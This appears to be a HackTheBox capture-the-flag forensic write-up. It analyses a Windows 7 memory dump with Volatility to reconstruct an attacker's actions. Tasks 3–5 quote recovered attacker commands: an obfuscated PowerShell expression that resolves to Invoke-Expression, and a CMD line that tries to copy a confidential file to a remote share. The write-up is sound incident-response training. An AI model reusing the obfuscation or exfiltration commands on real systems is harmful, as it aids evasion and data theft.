---
description: Recollection HackTheBox DFIR Sherlocks Writeup by Thamizhiniyan C S
---

# Recollection

## Sherlock Scenario

A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

{% embed url="https://app.hackthebox.com/sherlocks/Recollection" %}

***

## Setting up the Environment

First download the given file and extract it. I used the `file` command on the extracted file to identify its file type, but it didn't give anything interesting.

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Next I used Volatility to check whether the given file is a memory dump.

You can install Volatility from the following repository:

{% embed url="https://github.com/volatilityfoundation/volatility" %}

Else you can use the REMnux Distro, which has Volatility preinstalled.

{% embed url="https://remnux.org/" %}

In my case, I am using the REMnux Distro.

To check whether the given file is a memory dump, you can use the `imaginfo` plugin from the Volatility framework.

```bash
vol.py imageinfo -f recollection.bin

# -f - Memory Dump file
```

<figure><img src="../../../.gitbook/assets/Untitled 1.png" alt=""><figcaption></figcaption></figure>

From the output, we can see that the `imageinfo` command successfully exectued. Thus, the given file is a memory dump.

{% hint style="info" %}
Note:&#x20;

Volatility needs to know what type of system your memory dump came from, so it knows which data structures, algorithms, and symbols to use. You can supply the profile name using the`--profile argument.`

If you do not know what type of system the memory dump is from, use the `imageinfo` command to get suggested profiles from the Volatility Framework. Mostly the first suggestion from Volatlity will work fine.
{% endhint %}

***

## Task 1

### Question

What is the Operating System of the machine?

### Solution

We can use the `imageinfo` plugin to get the OS details.

```bash
vol.py imageinfo -f recollection.bin

# -f - Memory Dump file
```

<figure><img src="../../../.gitbook/assets/Untitled 1 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `Windows 7`

***

## Task 2

### Question

When was the memory dump created?

### Solution

We can use the `imageinfo` plugin to get the creation date of the memory dump.

```bash
vol.py imageinfo -f recollection.bin

# -f - Memory Dump file
```

<figure><img src="../../../.gitbook/assets/Untitled 1 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `2022-12-19 16:07:30`

***

## Task 3

### Question

After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

### Solution

To get the contents of the clipboard from the memory dump, we can us the `clipboard` plugin.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin clipboard

# --profile - Profile name
# -f - Memory Dump file
# clipboard - Extract the contents of the windows clipboard
```

<figure><img src="../../../.gitbook/assets/Untitled 2.png" alt=""><figcaption></figcaption></figure>

**Answer:** `(gv '*MDR*').naMe[3,11,2]-joIN''`

***

## Task 4

### Question

The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

### Solution

So to know the cmdlet name, we have to find the output of the obfuscated powershell code. Since, the attacker has copied the command, the attacker might have executed it. So I extracted the command history from the memory file using the `consoles` plugin.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 3 (1).png" alt=""><figcaption></figcaption></figure>

From the output, we can see that the attacker has executed the Powershell Command and the output of the command is '`iex`'. I searched google about iex and got the cmdlet name.

<figure><img src="../../../.gitbook/assets/Untitled 4 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `Invoke-Expression`

***

## Task 5

### Question

A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

### Solution

Again we can check the command history for the exfiltration attempt using the `consoles` plugin.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 5 (26).png" alt=""><figcaption></figcaption></figure>

**Answer:**&#x20;

`type C:\Users\Public\Secret\Confidential.txt > \192.168.0.171\pulice\pass.txt`

***

## Task 6

### Question

Following the above command, now tell us if the file was exfiltrated successfully?

### Solution

Again we can get the output of the command that we found in the last task from the command history using the `consoles` plugin.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

From the output we can see that the command was not executed successfully.

**Answer:** `No`

***

## Task 7

### Question

The attacker tried to create a readme file. What was the full path of the file?

### Solution

You can find a Powershell command from the command history that we got using the `consoles` plugin, which contains a encoded string which looks like base64 encoded.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 6 (27).png" alt=""><figcaption></figcaption></figure>

I used CyberChef to decode the base64 string.

<figure><img src="../../../.gitbook/assets/Untitled 7 (22).png" alt=""><figcaption></figcaption></figure>

From the output of CyberChef, we can see that the attacker has created a readme file at `C:\Users\Public\Office\readme.txt`,  with the message "`hacked by mafia`". From this we infer that the attacker name is `mafia`.

**Answer:** `C:\Users\Public\Office\readme.txt`

***

## Task 8

### Question

What was the Host Name of the machine?

### Solution

You can see that the attacker has executed the `net users` command to display user account information from the command history that we got using the `consoles` plugin, which contains the Host Name of the machine.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 8 (22).png" alt=""><figcaption></figcaption></figure>

**Answer:** `USER-PC`

***

## Task 9

### Question

How many user accounts were in the machine?

### Solution

You can see that the attacker has executed the `net users` command to display user account information from the command history that we got using the `consoles` plugin, which contains the users available in the machine.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 8 (22).png" alt=""><figcaption></figcaption></figure>

***

## Task 10

### Question

In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

### Solution

Volatility can extract all the file objects that are stored in the memory using the `filescan` plugin. Since, the file name that we are looking out for is given in the question, I used `grep` to filter the results.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin filescan | grep passwords.txt

# --profile - Profile name
# -f - Memory Dump file
# filescan - Pool scanner for file objects
```

<figure><img src="../../../.gitbook/assets/Untitled 15 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:**

`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

***

## Task 11

### Question

A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

### Solution

You can find the output of the malicious executable file from the command history that we got using the `consoles` plugin, from which you can get the filename, which is also a hash.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 10 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`

***

## Task 12

### Question

Following the previous question, what is the Imphash of the malicious file you found above?

### Solution

I used the hash that we got in the last task in the VirusTotal's search feature, to get more details about that file.

{% embed url="https://www.virustotal.com/gui/home/search" %}

<figure><img src="../../../.gitbook/assets/Untitled 11 (1).png" alt=""><figcaption></figcaption></figure>

From the results of VirusTotal, we can see that the file is a stealer. We can get the Imphash from the Details tab.

<figure><img src="../../../.gitbook/assets/Untitled 12 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `d3b592cd9481e4f053b5362e22d61595`

***

## Task 13

### Question

Following the previous question, tell us the date in UTC format when the malicious file was created?

### Solution

We can get the date from the VirusTotal Details section that we saw in the last task.

<figure><img src="../../../.gitbook/assets/Untitled 13 (1).png" alt=""><figcaption></figcaption></figure>

**Answer:** `2022-06-22 11:49:04`

***

## Task 14

### Question

What was the local IP address of the machine?

### Solution

You can use the `netscan` plugin of the Volatility framework to extract all the active connections and sockets.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin netscan

# --profile - Profile name
# -f - Memory Dump file
# netscan - Scan a Vista (or later) image for connections and sockets
```

<figure><img src="../../../.gitbook/assets/Untitled 17 (1).png" alt=""><figcaption></figcaption></figure>

From the ouput, we can see that the there is owner named system, which is the local IP address.

**Answer:** `192.168.0.104`

***

## Task 15

### Question

There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

### Solution

Use the `pstree` plugin to view the running processes in a tree view.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin pstree

# --profile - Profile name
# -f - Memory Dump file
# pstree - Print process list as a tree
```

<figure><img src="../../../.gitbook/assets/Untitled 18.png" alt=""><figcaption></figcaption></figure>

From the output, we can see that there are two Powershell instances of which, one has be spawned from the `cmd.exe` process, since the `powershell.exe` process with a `Pid` `3532` has the `PPid` as `4052`, which is the `Pid` of the process `cmd.exe`.

Answer: `cmd.exe`

***

## Task 16

### Question

Attacker might have used an email address to login a social media. Can you tell us the email address?

### Solution

First I extracted all the strings from the given memory dump using the `strings` command and put it in a file named `Strings.txt`.

```bash
strings -el recollection.txt > Strings.txt

# -el - Characters of size 16-bit
```

<figure><img src="../../../.gitbook/assets/Untitled 22.png" alt=""><figcaption></figcaption></figure>

With the help of python and regex, I extracted all the emails from the `Strings.txt` file.

```python
#! /usr/bin/python3

import re

file = "".join(open('Strings.txt', 'r').readlines())

emails = re.findall(r'\b[a-z0-9_-]+@[a-zA-Z0-9]+\.[a-z]{1,3}\b', file)

for each in emails:
    print(each)
```

You can the output of the above script below.

<figure><img src="../../../.gitbook/assets/Untitled 23.png" alt=""><figcaption></figcaption></figure>

From all the emails that were extracted, `mafia_code1337@gmail.com` is the email of interest, since we know that the attackers name is mafia.

**Answer:** `mafia_code1337@gmail.com`

***

## Task 17

### Question

Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

### Solution

First I checked whether MS Edge is running using the the `pstree` plugin to. Its running.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin pstree

# --profile - Profile name
# -f - Memory Dump file
# pstree - Print process list as a tree
```

<figure><img src="../../../.gitbook/assets/Untitled 20 (1).png" alt=""><figcaption></figcaption></figure>

Since, its mentioned that the victim searched about a SIEM solution using MS Edge browser, I searched about where MS Edge browser stores its search histories and found this article: [https://answers.microsoft.com/en-us/microsoftedge/forum/all/where-is-the-file-for-edge-history-stored/a6102594-d7ee-420d-afaa-77f2fc82b3ce](https://answers.microsoft.com/en-us/microsoftedge/forum/all/where-is-the-file-for-edge-history-stored/a6102594-d7ee-420d-afaa-77f2fc82b3ce), from which I came to know that Edge stores the history in the following path: `C:\Users{user}\AppData\Local\Microsoft\Edge\User Data\Default\History`.

The browser is still running, so we can extract the cached History file from the memory. For that we need the Address of this file in the memory. To get the memory address, I used the `filescan` plugin, with a  filter using the grep `command` looking out for the path `\AppData\Local\Microsoft\Edge\User Data\Default\History`.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin filescan | grep -F "\AppData\Local\Microsoft\Edge\User Data\Default\History"

# --profile - Profile name
# -f - Memory Dump file
# filescan - Pool scanner for file objects
# -F - Treat the search string as a fixed string, not a regular expression
```

<figure><img src="../../../.gitbook/assets/Untitled 24.png" alt=""><figcaption></figcaption></figure>

From the output of the previous command, we got the memory address. Now we can use the `dumpfiles` plugin to extract cached files from memory.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin dumpfiles --dump-dir=./MSEdge -Q 0x000000011e0d16f0

# --profile - Profile name
# -f - Memory Dump file
# dumpfiles - Extract memory mapped and cached files
# --dump-dir - Output location
# -Q - Dump File Object at physical address PHYSOFFSET
```

<figure><img src="../../../.gitbook/assets/Untitled 25.png" alt=""><figcaption></figcaption></figure>

After extracting the files, I checked the file type of `file.None.0xfffffa80056d1440.dat` file using the `file` command.

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

From the output of the above command, we can see that the file is a SQLite database. So I used the following online SQLite Viewer to view the contents of the database.

{% embed url="https://inloop.github.io/sqlite-viewer/" %}

<figure><img src="../../../.gitbook/assets/Untitled 26.png" alt=""><figcaption></figcaption></figure>

From the output of the above SQLite Viewer, we can see the search terms table, which has the searches done in that browser. From the terms, we can see that the attacker has searched for the SIEM tool `Wazuh`.

{% embed url="https://wazuh.com/" %}

**Answer:** `Wazuh`

***

## Task 18

### Question

The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?

### Solution

If we take a look at the command history from the memory file which we can extract using the `consoles` plugin, the victim has listed the Downloads directory which contains a file `csrsss.exe`.

There is windows system file named `csrss.exe` ( to know more about this file [https://www.file.net/process/csrss.exe.html](https://www.file.net/process/csrss.exe.html) ), which the attacker used to name the malware.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin consoles

# --profile - Profile name
# -f - Memory Dump file
# consoles - Extract command history by scanning for _CONSOLE_INFORMATION
```

<figure><img src="../../../.gitbook/assets/Untitled 27.png" alt=""><figcaption></figcaption></figure>

Answer: `csrsss.exe`

***

## Bonus Section

Out of curiosity, I also tried dumping the `csrsss.exe` file that the victim downloaded to know more about it.

First I enumerated the memory address of the csrsss.exe file using the `filescan` plugin with a grep filter.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin filescan | grep csrsss.exe

# --profile - Profile name
# -f - Memory Dump file
# filescan - Pool scanner for file objects
```

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

From the output, we can see that we have two addresses for the same file, both are same, so I dumped the first one using the `dumpfile` plugin.

```bash
vol.py --profile=Win7SP1x64 -f recollection.bin dumpfiles --dump-dir=./csrss/ -Q 0x000000011e955820

# --profile - Profile name
# -f - Memory Dump file
# dumpfiles - Extract memory mapped and cached files
# --dump-dir - Output location
# -Q - Dump File Object at physical address PHYSOFFSET
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Next, I checked the file type of the extracted file `file.None.0xfffffa8003ac3220.dat` using the `file` command.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

The extracted file is Windows executable. Next I uploaded the file to VirusTotal to know more about it.

{% embed url="https://www.virustotal.com/gui/home/upload" %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

From the results of VirusTotal, we infer that the file that the victim downloaded is a trojan. You can find more details about the malware here: [https://www.virustotal.com/gui/file/266da3c8353dbccc945217af3c7cd084a5352971953b978802d270450268fcb5](https://www.virustotal.com/gui/file/266da3c8353dbccc945217af3c7cd084a5352971953b978802d270450268fcb5)

***

## Summary

In this Sherlocks room, I learned about how to use Volatility Framework to enumerate memory dump files, specifically:

* Looking out for running processes
* Extracting MS Edge Browser history
* Extracting Command History
* Dumping Cached files from Memory
